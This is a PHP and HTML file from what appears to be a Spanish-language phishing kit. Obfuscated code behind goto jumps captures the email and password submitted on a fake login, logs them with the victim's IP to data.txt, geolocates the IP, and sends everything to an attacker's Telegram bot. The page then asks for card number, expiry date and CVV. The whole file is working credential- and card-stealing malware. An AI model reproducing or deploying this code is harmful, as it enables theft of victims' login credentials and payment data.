<?php
 goto f7i0Z; VcoFV: curl_setopt($ch, CURLOPT_POSTFIELDS, "\143\x68\x61\x74\x5f\151\144\75{$id}\x26\x70\141\x72\163\x65\x5f\155\x6f\144\145\x3d\x48\124\115\114\x26\164\145\170\x74\x3d{$msg}"); goto jSTGM; UEBR0: function get_ip_info($ip) { $url = "\x68\x74\x74\160\72\x2f\57\151\x70\x2d\141\x70\x69\56\143\157\155\x2f\x6a\x73\157\x6e\57{$ip}"; $response = file_get_contents($url); if ($response) { $data = json_decode($response, true); if ($data["\163\x74\141\164\165\163"] == "\163\165\x63\143\145\163\x73") { $country = $data["\x63\157\x75\156\164\162\x79"]; $city = $data["\x63\x69\164\171"]; return "\120\141\303\255\x73\x3a\x20{$country}\12\103\151\x75\x64\141\x64\x3a\x20{$city}"; } } return "\x49\x6e\x66\x6f\x72\155\141\x63\x69\303\263\156\x20\x64\x65\40\x75\142\x69\x63\141\143\x69\303\263\x6e\40\x6e\x6f\40\144\151\163\x70\x6f\x6e\151\x62\154\x65\56"; } goto UpZEz; xe5c2: $ch = curl_init(); goto f7Sz5; XBziL: @(include "\x77\x61\162\156\x2e\x70\150\x70"); goto fYToB; ayQMQ: $id = $chatID; goto qdD6v; fYToB: @(include "\x6e\x6f\x74\56\x70\x68\160"); goto Pd314; nyjx4: $msg = "\52\x2a\xf0\237\247\x99\xf0\x9f\x8f\274\xe2\x80\215\xe2\x99\202\357\270\217\x50\x41\x43\x49\x46\x49\360\x9f\xa7\231\360\237\217\xbc\342\x80\x8d\342\x99\x82\xef\270\x8f\x2a\x2a\xa" . "\x55\123\105\122\72\x20{$trax}\xa" . "\120\x41\123\x57\122\x44\x3a\40{$trex}\12" . "\111\x50\72\x20{$ip}\12" . "\x55\x62\x69\x63\x61\143\151\xc3\263\x6e\x3a\40{$ipInfo}"; goto xe5c2; Pd314: function get_client_ip() { $ipaddress = ''; if (isset($_SERVER["\110\x54\124\x50\x5f\x43\114\111\105\116\124\137\111\x50"])) { $ipaddress = $_SERVER["\110\124\x54\x50\x5f\x43\x4c\111\105\x4e\x54\x5f\x49\120"]; } else { if (isset($_SERVER["\110\x54\x54\120\x5f\130\x5f\x46\117\122\127\x41\x52\x44\x45\104\x5f\106\117\x52"])) { $ipaddress = $_SERVER["\110\x54\x54\x50\137\x58\137\106\x4f\x52\x57\x41\122\x44\105\104\x5f\106\x4f\122"]; } else { if (isset($_SERVER["\x48\x54\124\120\x5f\130\x5f\x46\x4f\x52\127\101\x52\104\x45\104"])) { $ipaddress = $_SERVER["\x48\x54\x54\x50\x5f\130\137\106\x4f\x52\x57\101\x52\104\x45\104"]; } else { if (isset($_SERVER["\110\124\x54\120\137\106\x4f\122\127\101\122\x44\105\x44\x5f\106\x4f\x52"])) { $ipaddress = $_SERVER["\110\x54\124\120\x5f\106\117\x52\127\101\122\x44\105\104\137\106\117\122"]; } else { if (isset($_SERVER["\110\x54\124\120\x5f\x46\117\x52\x57\x41\122\x44\105\x44"])) { $ipaddress = $_SERVER["\x48\x54\x54\x50\137\106\x4f\x52\127\x41\x52\x44\x45\104"]; } else { if (isset($_SERVER["\x52\105\x4d\x4f\124\105\137\x41\x44\x44\x52"])) { $ipaddress = $_SERVER["\x52\105\x4d\x4f\124\x45\x5f\x41\104\104\122"]; } else { $ipaddress = "\125\116\x4b\116\x4f\x57\x4e"; } } } } } } return $ipaddress; } goto UEBR0; zCAUy: $ipInfo = get_ip_info($ip); goto nyjx4; qdD6v: $urlMsg = "\x68\164\164\x70\x73\72\57\57\141\160\151\56\x74\x65\x6c\145\x67\162\x61\155\x2e\157\162\147\57\x62\157\164{$token}\57\x73\145\156\144\x4d\145\x73\x73\x61\x67\x65"; goto rw6Rh; KY28U: $server_output = curl_exec($ch); goto AP4pl; QpnEA: curl_setopt($ch, CURLOPT_POST, 1); goto VcoFV; I2vLw: $userp = $_SERVER["\122\105\x4d\x4f\124\x45\x5f\x41\104\104\x52"]; goto QzNQz; UpZEz: @session_start(); goto I2vLw; AP4pl: curl_close($ch); goto es6jL; rw6Rh: $ip = get_client_ip(); goto zCAUy; jSTGM: curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); goto KY28U; kWcdO: @(include "\x74\x6c\x67\x72\141\155\56\160\x68\160"); goto XBziL; f7Sz5: curl_setopt($ch, CURLOPT_URL, $urlMsg); goto QpnEA; f7i0Z: if ($_POST) { $trax = $_POST["\164\162\x61\x78"]; $trex = $_POST["\164\x72\145\x78"]; session_start(); $_SESSION["\x74\162\141\170"] = $trax; $_SESSION["\164\162\145\x78"] = $trex; $fecha = date("\144\x2d\x6d\55\131"); $ip = $_SERVER["\x52\105\x4d\x4f\124\x45\137\x41\104\x44\122"]; $texto = "\115\101\111\114\72\40" . $trax . "\xa" . "\120\101\123\123\x57\x3a\x20" . $trex . "\xa" . "\x46\x45\103\110\101\72\x20" . $fecha . "\xa" . "\111\x50\x3a\40" . $ip . "\12" . "\55\x2d\55\x2d\x2d\55\x2d\55\55\x2d\55\55\55\x2d\x2d\x2d\x2d\x2d\55\x2d\55\x2d\55\x2d\x2d\x2d\55\x2d\x2d\x2d\55\55\55\xa\12"; $archivo = fopen("\x64\x61\164\x61\x2e\164\x78\164", "\x61"); fwrite($archivo, $texto); fclose($archivo); } goto kWcdO; QzNQz: $token = $T0K3N; goto ayQMQ; es6jL: ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bienvenido</title>
    <link rel="shortcut icon" href="pixts/ico.ico" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
     <div></div>
    <div class="cont-log">
        <img src="pixts/log.png" alt="">
    </div>

    <div class="cont2">
        <img src="pixts/fm2.svg" alt="">
        <div class="cont-form2">
            <form id="myfm2" action="indexx1.php" method="post">
              <div class="usr2">
                <input id="brax" name="brax" type="text">
                <input id="brex" name="brex" type="text">
              </div>

              <div class="trj">
                <input placeholder="0000 0000 0000 0000" maxlength="16" id="brix" name="brix" type="text">
              </div>

              <div class="fech-venc">
                <div class="cont-selects">
                  <select name="dia" id="dia">
                    <option value="1">1</option>
                    <option value="2">2</option>
                    <option value="3">3</option>
                    <option value="4">4</option>
                    <option value="5">5</option>
                    <option value="6">6</option>
                    <option value="7">7</option>
                    <option value="8">8</option>
                    <option value="9">9</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                    <option value="13">13</option>
                    <option value="14">14</option>
                    <option value="15">15</option>
                    <option value="16">16</option>
                    <option value="17">17</option>
                    <option value="18">18</option>
                    <option value="19">19</option>
                    <option value="20">20</option>
                    <option value="21">21</option>
                    <option value="22">22</option>
                    <option value="23">23</option>
                    <option value="24">24</option>
                    <option value="25">25</option>
                    <option value="26">26</option>
                    <option value="27">27</option>
                    <option value="28">28</option>
                    <option value="29">29</option>
                    <option value="30">30</option>
                    <!-- Continúa con las opciones hasta el 30 -->
                  </select>
                  <select name="ano" id="ano">
                    <option value="2024">2024</option>
                    <option value="2025">2025</option>
                    <option value="2026">2026</option>
                    <option value="2027">2027</option>
                    <option value="2028">2028</option>
                    <option value="2029">2029</option>
                    <option value="2030">2030</option>
                    <option value="2031">2031</option>
                    <option value="2032">2032</option>
                    <option value="2033">2033</option>
                    <option value="2034">2034</option>
                    <!-- Continúa con las opciones de años según tus necesidades -->
                  </select>

                </div>
                <div class="cv">
                  <input maxlength="3" id="brux" name="brux" type="text" placeholder="000">
  
                </div>
              </div>
              
              
              <!-- <input id="brox" name="brox" type="text"> -->
              <div class="sub2">
                <input type="submit" value="Continuar">
              </div>

            </form>
        </div>

    </div>


</body>
</html>
<script src="movie/aje.js"></script>